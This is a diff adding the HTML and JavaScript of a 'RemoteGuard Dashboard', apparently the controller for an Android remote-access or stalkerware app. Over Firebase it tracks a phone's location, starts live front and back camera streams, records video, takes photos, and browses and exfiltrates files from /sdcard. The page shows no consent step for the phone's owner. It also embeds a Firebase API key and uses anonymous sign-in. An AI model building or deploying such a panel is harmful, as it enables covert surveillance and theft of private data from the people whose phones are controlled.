@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RemoteGuard Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-storage-compat.js"></script>
+    <style>
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+    </style>
+</head>
+<body class="bg-gray-900 text-white font-sans">
+    <div class="container mx-auto p-6">
+        <header class="flex justify-between items-center mb-10 border-b border-gray-700 pb-6">
+            <h1 class="text-3xl font-bold text-indigo-400">RemoteGuard Dashboard</h1>
+            <div id="connection-status" class="px-3 py-1 rounded-full text-xs font-semibold bg-red-900 text-red-200">Disconnected</div>
+        </header>
+
+        <div class="grid grid-cols-1 md:grid-cols-4 gap-6">
+            <!-- Sidebar: Device List -->
+            <div class="col-span-1 bg-gray-800 p-4 rounded-xl shadow-lg border border-gray-700">
+                <h2 class="text-lg font-semibold mb-4">Devices</h2>
+                <div id="device-list" class="space-y-2">
+                    <p class="text-gray-400 text-sm">Loading devices...</p>
+                </div>
+            </div>
+
+            <!-- Main Content -->
+            <div class="col-span-3 bg-gray-800 p-6 rounded-xl shadow-lg border border-gray-700">
+                <div id="no-device-selected" class="h-64 flex items-center justify-center text-gray-500">
+                    Select a device to start monitoring
+                </div>
+
+                <div id="device-details" class="hidden">
+                    <div class="flex justify-between items-center mb-6">
+                        <div>
+                            <h2 id="selected-device-model" class="text-2xl font-bold">Device Name</h2>
+                            <p id="selected-device-id" class="text-sm text-gray-400">ID: ABCDEF12</p>
+                        </div>
+                        <div class="flex space-x-2">
+                            <button onclick="sendCommand('get_location')" class="bg-indigo-600 hover:bg-indigo-700 px-4 py-2 rounded-lg text-sm transition">Refresh Info</button>
+                        </div>
+                    </div>
+
+                    <!-- Tabs -->
+                    <div class="flex border-b border-gray-700 mb-6">
+                        <button onclick="showTab('location')" class="tab-btn px-4 py-2 border-b-2 border-transparent hover:text-indigo-400 transition">Location</button>
+                        <button onclick="showTab('camera')" class="tab-btn px-4 py-2 border-b-2 border-transparent hover:text-indigo-400 transition">Camera</button>
+                        <button onclick="showTab('video')" class="tab-btn px-4 py-2 border-b-2 border-transparent hover:text-indigo-400 transition">Video</button>
+                        <button onclick="showTab('files')" class="tab-btn px-4 py-2 border-b-2 border-transparent hover:text-indigo-400 transition">Files</button>
+                        <button onclick="showTab('commands')" class="tab-btn px-4 py-2 border-b-2 border-transparent hover:text-indigo-400 transition">History</button>
+                    </div>
+
+                    <!-- Tab Contents -->
+                    <div id="location" class="tab-content">
+                        <div id="map-container" class="h-96 bg-gray-700 rounded-lg flex items-center justify-center mb-4">
+                            <div id="map-info" class="text-center p-4">
+                                <p class="text-xl font-mono text-indigo-300 mb-2" id="lat-lng">0.0, 0.0</p>
+                                <p class="text-sm text-gray-400">View on <a id="google-maps-link" href="#" target="_blank" class="underline text-indigo-400">Google Maps</a></p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="camera" class="tab-content">
+                        <div class="mb-8 p-4 bg-black rounded-xl border border-gray-700">
+                            <h3 class="text-indigo-400 font-bold mb-4 flex items-center justify-between">
+                                <span class="flex items-center">
+                                    <span class="w-3 h-3 bg-red-600 rounded-full mr-2 animate-pulse"></span>
+                                    LIVE STREAM
+                                </span>
+                                <span id="current-camera-badge" class="bg-gray-700 text-gray-300 text-[10px] px-2 py-1 rounded uppercase">Back Camera</span>
+                            </h3>
+                            <div class="relative w-full aspect-video bg-gray-800 rounded-lg overflow-hidden flex items-center justify-center mb-4">
+                                <img id="live-frame" class="w-full h-full object-contain hidden" src="" alt="Live Stream">
+                                <div id="live-placeholder" class="text-gray-500 text-sm">Stream Inactive</div>
+                            </div>
+                            <div class="flex space-x-2 mb-4">
+                                <button onclick="sendCommand('start_stream')" class="flex-1 bg-indigo-600 hover:bg-indigo-700 py-2 rounded-lg font-bold transition">START STREAM</button>
+                                <button onclick="sendCommand('stop_stream')" class="flex-1 bg-gray-700 hover:bg-gray-600 py-2 rounded-lg font-bold transition">STOP STREAM</button>
+                            </div>
+                            <button onclick="sendCommand('switch_camera')" class="w-full bg-orange-600 hover:bg-orange-700 py-2 rounded-lg font-bold transition flex items-center justify-center">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
+                                </svg>
+                                SWITCH TO <span id="switch-target-label" class="ml-1">FRONT</span> CAMERA
+                            </button>
+                        </div>
+
+                        <h3 class="text-gray-400 font-bold mb-4">PHOTO CAPTURE</h3>
+                        <button onclick="sendCommand('take_photo')" class="w-full bg-green-600 hover:bg-green-700 py-3 rounded-xl font-bold mb-6 transition">CAPTURE HIGH-RES PHOTO</button>
+                        <div id="photo-gallery" class="grid grid-cols-2 md:grid-cols-3 gap-4">
+                            <!-- Photos will appear here -->
+                        </div>
+                    </div>
+
+                    <div id="video" class="tab-content">
+                        <div class="mb-8 p-4 bg-black rounded-xl border border-gray-700">
+                            <h3 class="text-indigo-400 font-bold mb-4 flex items-center justify-between">
+                                <span class="flex items-center">
+                                    <span class="w-3 h-3 bg-red-600 rounded-full mr-2"></span>
+                                    VIDEO RECORDER
+                                </span>
+                                <span id="current-camera-badge-video" class="bg-gray-700 text-gray-300 text-[10px] px-2 py-1 rounded uppercase">Back Camera</span>
+                            </h3>
+                            <div class="flex space-x-2 mb-4">
+                                <button id="start-video-btn" onclick="sendCommand('start_video'); this.classList.add('hidden'); document.getElementById('stop-video-btn').classList.remove('hidden')" class="flex-1 bg-red-600 hover:bg-red-700 py-2 rounded-lg font-bold transition">START RECORDING</button>
+                                <button id="stop-video-btn" onclick="sendCommand('stop_video'); this.classList.add('hidden'); document.getElementById('start-video-btn').classList.remove('hidden')" class="flex-1 bg-gray-700 hover:bg-gray-600 py-2 rounded-lg font-bold hidden transition">STOP RECORDING</button>
+                            </div>
+                            <button onclick="sendCommand('switch_camera')" class="w-full bg-orange-600 hover:bg-orange-700 py-2 rounded-lg font-bold transition flex items-center justify-center">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
+                                </svg>
+                                SWITCH TO <span id="switch-target-label-video" class="ml-1">FRONT</span> CAMERA
+                            </button>
+                        </div>
+
+                        <h3 class="text-gray-400 font-bold mb-4">RECORDED VIDEOS</h3>
+                        <div id="video-list" class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <!-- Videos will appear here -->
+                        </div>
+                    </div>
+
+                    <div id="files" class="tab-content">
+                        <div class="flex justify-between items-center mb-4">
+                            <div class="flex items-center space-x-2 overflow-hidden">
+                                <button onclick="sendCommand('list_files')" class="bg-gray-700 hover:bg-gray-600 px-3 py-1 rounded text-sm shrink-0">🏠 Home</button>
+                                <button onclick="goBackFolder()" class="bg-gray-700 hover:bg-gray-600 px-3 py-1 rounded text-sm shrink-0">⬅️ Back</button>
+                                <span id="current-path" class="text-[10px] text-gray-500 font-mono truncate bg-black px-2 py-1 rounded">/sdcard</span>
+                            </div>
+                            <button onclick="refreshCurrentFolder()" class="bg-indigo-600 hover:bg-indigo-700 px-3 py-1 rounded text-sm shrink-0">🔄 Refresh</button>
+                        </div>
+                        <div class="overflow-x-auto max-h-96 overflow-y-auto mb-4">
+                            <table class="w-full text-left">
+                                <thead class="border-b border-gray-700 text-gray-400 text-sm sticky top-0 bg-gray-800">
+                                    <tr>
+                                        <th class="pb-2 w-8">
+                                            <input type="checkbox" id="select-all-files" onchange="toggleSelectAll()" class="cursor-pointer">
+                                        </th>
+                                        <th class="pb-2">Name</th>
+                                        <th class="pb-2">Size</th>
+                                        <th class="pb-2 text-right">Action</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="file-list-body">
+                                    <!-- Files will appear here -->
+                                </tbody>
+                            </table>
+                        </div>
+                        <div id="selection-controls" class="mb-8 hidden flex items-center justify-between gap-2">
+                            <span id="selected-count" class="text-sm text-gray-400">0 files selected</span>
+                            <button onclick="downloadSelectedFiles()" class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded text-sm font-semibold transition">📥 Download Selected</button>
+                        </div>
+
+                        <h3 class="text-gray-400 font-bold mb-4">ACCESS DOWNLOADED FILES</h3>
+                        <div id="uploaded-files-list" class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <!-- Cloudinary uploaded files will appear here -->
+                            <p class="text-gray-500 text-sm col-span-2">No files downloaded yet. Click "Download" on a file above to upload it here.</p>
+                        </div>
+                    </div>
+
+                    <!-- Preview Modal -->
+                    <div id="preview-modal" class="hidden fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 p-4">
+                        <div class="bg-gray-800 rounded-lg max-w-2xl w-full max-h-[90vh] overflow-auto border border-gray-700">
+                            <div class="flex justify-between items-center p-4 border-b border-gray-700 sticky top-0 bg-gray-800">
+                                <span id="preview-title" class="text-white font-semibold truncate"></span>
+                                <button onclick="closePreview()" class="text-gray-400 hover:text-white text-2xl leading-none">×</button>
+                            </div>
+                            <div class="p-4 flex items-center justify-center">
+                                <img id="preview-image" class="max-w-full max-h-[70vh] rounded hidden" alt="">
+                                <video id="preview-video" class="max-w-full max-h-[70vh] rounded hidden" controls></video>
+                                <div id="preview-loading" class="text-gray-400">Loading preview...</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="commands" class="tab-content">
+                        <div class="bg-black p-4 rounded-lg font-mono text-xs h-64 overflow-y-auto space-y-1" id="activity-log">
+                            <p class="text-gray-500">> Waiting for activity...</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // CONFIGURATION - ENTER YOUR FIREBASE CONFIG HERE
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlfGFAZ7b4uvuNNQMnKcEGAzZo_qwy5LQ",
+            authDomain: "apk-remote-32962.firebaseapp.com",
+            databaseURL: "https://apk-remote-32962-default-rtdb.firebaseio.com",
+            projectId: "apk-remote-32962",
+            storageBucket: "apk-remote-32962.firebasestorage.app",
+            messagingSenderId: "496485627428",
+            appId: "1:496485627428:web:1e6ddebc431f0b9c144ab1",
+            measurementId: "G-FQDVWNTH5T"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const auth = firebase.auth();
+        let currentDeviceId = null;
+        let lastKnownPath = "/sdcard";
+        let selectedFiles = new Set();
+        console.log('Firebase initialized', firebaseConfig);
+
+        // Anonymous Sign-in
+        auth.signInAnonymously().then(() => {
+            console.log("Signed in anonymously");
+            document.getElementById('connection-status').innerText = 'Authenticating...';
+            loadDevices();
+        }).catch((error) => {
+            console.error("Auth Error:", error);
+            document.getElementById('connection-status').innerText = 'Auth Error: ' + error.message;
+        });
+
+        function loadDevices() {
+            db.ref('devices').on('value', (snapshot) => {
+                const list = document.getElementById('device-list');
+                list.innerHTML = '';
+                if (!snapshot.exists()) {
+                    list.innerHTML = '<p class="text-gray-400 text-sm">No devices found. Ensure the app is running and linked.</p>';
+                }
+                snapshot.forEach((child) => {
+                    const device = child.val();
+                    const id = child.key;
+                    const div = document.createElement('div');
+                    div.className = `p-3 rounded-lg cursor-pointer transition ${currentDeviceId === id ? 'bg-indigo-900 border border-indigo-500' : 'bg-gray-700 hover:bg-gray-600'}`;
+                    div.innerHTML = `
+                        <p class="font-bold">${device.info?.model || 'Unknown'}</p>
+                        <p class="text-xs text-gray-400">ID: ${id}</p>
+                    `;
+                    div.onclick = () => selectDevice(id, device);
+                    list.appendChild(div);
+                });
+                document.getElementById('connection-status').innerText = 'Connected to Firebase';
+                document.getElementById('connection-status').className = 'px-3 py-1 rounded-full text-xs font-semibold bg-green-900 text-green-200';
+            }, (error) => {
+                console.error("Database Error:", error);
+                document.getElementById('connection-status').innerText = 'Database Error: ' + error.message;
+            });
+        }
+
+        function selectDevice(id, device) {
+            currentDeviceId = id;
+            document.getElementById('no-device-selected').classList.add('hidden');
+            document.getElementById('device-details').classList.remove('hidden');
+            document.getElementById('selected-device-model').innerText = device.info?.model || 'Unknown Device';
+            document.getElementById('selected-device-id').innerText = `ID: ${id}`;
+
+            // Initial Tab
+            showTab('location');
+            updateUI(device);
+
+            // Listen for specific device updates
+            db.ref('devices/' + id).on('value', (snap) => {
+                updateUI(snap.val());
+            });
+        }
+
+        function updateUI(device) {
+            if (!device) return;
+
+            // Update Camera Status Badge and Switch Button Labels
+            const status = device.info?.status || "";
+            const currentBadge = document.getElementById('current-camera-badge');
+            const currentBadgeVideo = document.getElementById('current-camera-badge-video');
+            const targetLabel = document.getElementById('switch-target-label');
+            const targetLabelVideo = document.getElementById('switch-target-label-video');
+
+            if (status.includes("camera_switched_FRONT")) {
+                if (currentBadge) currentBadge.innerText = "Front Camera";
+                if (currentBadgeVideo) currentBadgeVideo.innerText = "Front Camera";
+                if (targetLabel) targetLabel.innerText = "BACK";
+                if (targetLabelVideo) targetLabelVideo.innerText = "BACK";
+            } else if (status.includes("camera_switched_BACK")) {
+                if (currentBadge) currentBadge.innerText = "Back Camera";
+                if (currentBadgeVideo) currentBadgeVideo.innerText = "Back Camera";
+                if (targetLabel) targetLabel.innerText = "FRONT";
+                if (targetLabelVideo) targetLabelVideo.innerText = "FRONT";
+            }
+
+            // Location update
+            if (device.location) {
+                const { latitude, longitude } = device.location;
+                document.getElementById('lat-lng').innerText = `${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
+                document.getElementById('google-maps-link').href = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            }
+
+            // Photos update
+            const photoGallery = document.getElementById('photo-gallery');
+            photoGallery.innerHTML = '';
+            if (device.photos) {
+                Object.values(device.photos).reverse().forEach(url => {
+                    const img = document.createElement('img');
+                    img.src = url;
+                    img.className = "w-full h-32 object-cover rounded-lg border border-gray-600 hover:scale-105 transition cursor-pointer";
+                    img.onclick = () => window.open(url, '_blank');
+                    photoGallery.appendChild(img);
+                });
+            }
+
+            // Live frame update
+            const liveImg = document.getElementById('live-frame');
+            const livePlaceholder = document.getElementById('live-placeholder');
+            if (device.live_frame) {
+                liveImg.src = device.live_frame + "?t=" + Date.now(); // Cache busting
+                liveImg.classList.remove('hidden');
+                livePlaceholder.classList.add('hidden');
+            } else {
+                liveImg.classList.add('hidden');
+                livePlaceholder.classList.remove('hidden');
+            }
+
+            // Videos update
+            const videoList = document.getElementById('video-list');
+            videoList.innerHTML = '';
+            if (device.videos) {
+                Object.values(device.videos).reverse().forEach(video => {
+                    const playbackUrl = video.playbackUrl || video.url;
+                    const div = document.createElement('div');
+                    div.className = "bg-gray-700 p-3 rounded-lg border border-gray-600";
+                    div.innerHTML = `
+                        <p class="text-xs text-gray-400 mb-2">${new Date(video.timestamp).toLocaleString()}</p>
+                        <video controls class="w-full rounded bg-black">
+                            <source src="${playbackUrl}" type="video/mp4">
+                        </video>
+                        <a href="${video.url}" target="_blank" class="text-indigo-400 text-xs mt-2 block hover:underline">Download Video</a>
+                    `;
+                    videoList.appendChild(div);
+                });
+            }
+
+            // Files update
+            const fileList = document.getElementById('file-list-body');
+            fileList.innerHTML = '';
+            selectedFiles.clear();
+            updateSelectionUI();
+
+            if (device.fileList) {
+                // Infer current path from the first file if possible
+                if (device.fileList.length > 0) {
+                    const firstItem = device.fileList[0];
+                    const fullPath = firstItem.path;
+                    const folderPath = fullPath.substring(0, fullPath.lastIndexOf('/'));
+                    lastKnownPath = folderPath || "/sdcard";
+                    document.getElementById('current-path').innerText = lastKnownPath;
+                }
+
+                device.fileList.forEach(file => {
+                    const tr = document.createElement('tr');
+                    tr.className = "border-b border-gray-700 text-sm hover:bg-gray-750 transition";
+
+                    let checkboxCell = `<td class="py-3 w-8"></td>`;
+                    if (!file.isDirectory) {
+                        const fileKey = file.path.replace(/\\/g, '/');
+                        checkboxCell = `
+                            <td class="py-3 w-8">
+                                <input type="checkbox" class="file-checkbox cursor-pointer" value="${fileKey}" onchange="updateFileSelection(this)">
+                            </td>
+                        `;
+                    }
+
+                    const fileKey = file.path.replace(/\\/g, '/');
+                    const isImage = /\.(jpg|jpeg|png|gif|webp|bmp|svg)$/i.test(file.name);
+                    const isVideo = /\.(mp4|avi|mkv|mov|wmv|flv|webm|m4v)$/i.test(file.name);
+                    const isPreviewable = !file.isDirectory && (isImage || isVideo);
+
+                    let icon = '📄';
+                    if (file.isDirectory) icon = '📁';
+                    else if (isImage) icon = '🖼️';
+                    else if (isVideo) icon = '🎥';
+
+                    const nameCell = `
+                        <td class="py-3 flex items-center ${isPreviewable ? 'cursor-pointer hover:text-indigo-300 transition' : 'cursor-pointer'}" onclick="${file.isDirectory ? `openFolder('${fileKey}')` : (isPreviewable ? `openPreview('${fileKey}', '${file.name}', '${isImage ? 'image' : 'video'}')` : '')}">
+                            <span class="mr-2">${icon}</span>
+                            <span class="${file.isDirectory ? 'text-indigo-300 font-semibold' : ''}">${file.name}</span>
+                        </td>
+                    `;
+
+                    const sizeCell = `<td class="py-3 text-gray-400">${file.isDirectory ? '--' : (file.size / 1024 / 1024).toFixed(2) + ' MB'}</td>`;
+
+                    const actionCell = `
+                        <td class="py-3 text-right">
+                            ${!file.isDirectory ? `<button onclick="sendCommand('upload_file:${fileKey}')" class="bg-indigo-900 text-indigo-200 px-2 py-1 rounded text-xs hover:bg-indigo-800 transition">Download</button>` : ''}
+                        </td>
+                    `;
+
+                    tr.innerHTML = checkboxCell + nameCell + sizeCell + actionCell;
+                    fileList.appendChild(tr);
+                });
+            }
+
+            // Uploaded Files (from Cloudinary)
+            const uploadedList = document.getElementById('uploaded-files-list');
+            if (device.files) {
+                uploadedList.innerHTML = '';
+                Object.values(device.files).reverse().forEach(file => {
+                    const isImage = /\.(jpg|jpeg|png|gif|webp)$/i.test(file.name);
+                    const div = document.createElement('div');
+                    div.className = "bg-gray-700 p-3 rounded-lg border border-gray-600 flex items-center justify-between";
+                    div.innerHTML = `
+                        <div class="flex items-center space-x-3 overflow-hidden">
+                            <span class="text-2xl">${isImage ? '🖼️' : '📄'}</span>
+                            <div class="overflow-hidden">
+                                <p class="text-sm font-semibold truncate">${file.name}</p>
+                                <a href="${file.url}" target="_blank" class="text-xs text-indigo-400 hover:underline">View/Download</a>
+                            </div>
+                        </div>
+                        ${isImage ? `<img src="${file.url}" class="w-10 h-10 object-cover rounded shadow-sm">` : ''}
+                    `;
+                    uploadedList.appendChild(div);
+                });
+            }
+        }
+
+        function openFolder(path) {
+            lastKnownPath = path;
+            sendCommand(`list_files:${path}`);
+        }
+
+        function goBackFolder() {
+            if (lastKnownPath === "/sdcard" || lastKnownPath === "/" || !lastKnownPath.includes('/')) {
+                sendCommand('list_files');
+                return;
+            }
+            const parentPath = lastKnownPath.substring(0, lastKnownPath.lastIndexOf('/'));
+            if (parentPath) openFolder(parentPath);
+            else sendCommand('list_files');
+        }
+
+        function refreshCurrentFolder() {
+            sendCommand(`list_files:${lastKnownPath}`);
+        }
+
+        function sendCommand(cmd) {
+            if (!currentDeviceId) return;
+            const commandId = Date.now();
+            db.ref(`devices/${currentDeviceId}/commands/${commandId}`).set({
+                command: cmd,
+                timestamp: firebase.database.ServerValue.TIMESTAMP,
+                status: 'pending'
+            });
+            const log = document.getElementById('activity-log');
+            log.innerHTML += `<p class="text-indigo-300">> Sent: ${cmd}</p>`;
+            log.scrollTop = log.scrollHeight;
+        }
+
+        function showTab(tabId) {
+            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+            document.getElementById(tabId).classList.add('active');
+            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('border-indigo-500', 'text-indigo-400'));
+            event.target.classList.add('border-indigo-500', 'text-indigo-400');
+        }
+
+        function updateFileSelection(checkbox) {
+            const fileKey = checkbox.value;
+            if (checkbox.checked) {
+                selectedFiles.add(fileKey);
+            } else {
+                selectedFiles.delete(fileKey);
+            }
+            updateSelectionUI();
+        }
+
+        function toggleSelectAll() {
+            const selectAllCheckbox = document.getElementById('select-all-files');
+            const fileCheckboxes = document.querySelectorAll('.file-checkbox');
+
+            selectedFiles.clear();
+            fileCheckboxes.forEach(checkbox => {
+                checkbox.checked = selectAllCheckbox.checked;
+                if (selectAllCheckbox.checked) {
+                    selectedFiles.add(checkbox.value);
+                }
+            });
+            updateSelectionUI();
+        }
+
+        function updateSelectionUI() {
+            const selectionControls = document.getElementById('selection-controls');
+            const selectedCount = document.getElementById('selected-count');
+            const selectAllCheckbox = document.getElementById('select-all-files');
+
+            selectedCount.innerText = `${selectedFiles.size} file${selectedFiles.size !== 1 ? 's' : ''} selected`;
+
+            if (selectedFiles.size > 0) {
+                selectionControls.classList.remove('hidden');
+            } else {
+                selectionControls.classList.add('hidden');
+            }
+
+            const fileCheckboxes = document.querySelectorAll('.file-checkbox');
+            const allChecked = fileCheckboxes.length > 0 && Array.from(fileCheckboxes).every(cb => cb.checked);
+            selectAllCheckbox.checked = allChecked;
+        }
+
+        function downloadSelectedFiles() {
+            if (selectedFiles.size === 0) {
+                alert('Please select at least one file to download');
+                return;
+            }
+
+            selectedFiles.forEach(filePath => {
+                sendCommand(`upload_file:${filePath}`);
+            });
+
+            alert(`Download started for ${selectedFiles.size} file${selectedFiles.size !== 1 ? 's' : ''}`);
+        }
+
+        function openPreview(filePath, fileName, fileType) {
+            const modal = document.getElementById('preview-modal');
+            const title = document.getElementById('preview-title');
+            const previewImage = document.getElementById('preview-image');
+            const previewVideo = document.getElementById('preview-video');
+            const previewLoading = document.getElementById('preview-loading');
+
+            title.innerText = fileName;
+            previewImage.classList.add('hidden');
+            previewVideo.classList.add('hidden');
+            previewLoading.classList.remove('hidden');
+            modal.classList.remove('hidden');
+
+            // Request preview from device
+            const commandId = Date.now();
+            db.ref(`devices/${currentDeviceId}/commands/${commandId}`).set({
+                command: `preview_file:${filePath}`,
+                timestamp: firebase.database.ServerValue.TIMESTAMP,
+                status: 'pending'
+            });
+
+            // Listen for preview response
+            const previewRef = db.ref(`devices/${currentDeviceId}/preview`);
+            const previewListener = previewRef.on('value', (snapshot) => {
+                const preview = snapshot.val();
+                if (preview && preview.path === filePath) {
+                    previewLoading.classList.add('hidden');
+                    if (fileType === 'image') {
+                        previewImage.src = preview.url;
+                        previewImage.classList.remove('hidden');
+                    } else if (fileType === 'video') {
+                        previewVideo.src = preview.url;
+                        previewVideo.classList.remove('hidden');
+                    }
+                    previewRef.off('value', previewListener);
+                }
+            });
+
+            // Timeout after 30 seconds
+            setTimeout(() => {
+                previewRef.off('value', previewListener);
+                if (!previewImage.classList.contains('hidden') || !previewVideo.classList.contains('hidden')) {
+                    return;
+                }
+                previewLoading.innerText = 'Preview unavailable. Click Download to get the file.';
+            }, 30000);
+        }
+
+        function closePreview() {
+            const modal = document.getElementById('preview-modal');
+            const previewImage = document.getElementById('preview-image');
+            const previewVideo = document.getElementById('preview-video');
+
+            previewImage.src = '';
+            previewVideo.src = '';
+            previewImage.classList.add('hidden');
+            previewVideo.classList.add('hidden');
+            modal.classList.add('hidden');
+        }
+    </script>
+</body>
+</html>
